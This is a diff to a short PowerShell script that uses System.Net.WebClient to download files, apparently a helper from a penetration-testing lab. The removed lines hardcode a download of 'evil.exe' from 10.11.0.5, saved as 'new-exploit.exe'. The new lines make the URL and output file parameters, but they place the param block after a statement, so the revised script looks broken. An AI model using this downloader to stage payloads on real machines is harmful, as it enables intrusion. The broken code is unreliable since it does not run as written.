@@ -1,5 +1,8 @@
-$storageDir = $pwd
+$curDir = $pwd
+param (
+    [Parameter(Mandatory=$true)][string]$url,
+    [Parameter(Mandatory=$true)][string]$outfile
+)
+$output = -join($curDir, "\", $outfile)
 $webclient = New-Object System.Net.WebClient
-$url = "http://10.11.0.5/evil.exe"
-$file = "new-exploit.exe"
-$webclient.DownloadFile($url, $file)
+$webclient.DownloadFile($url, $output)
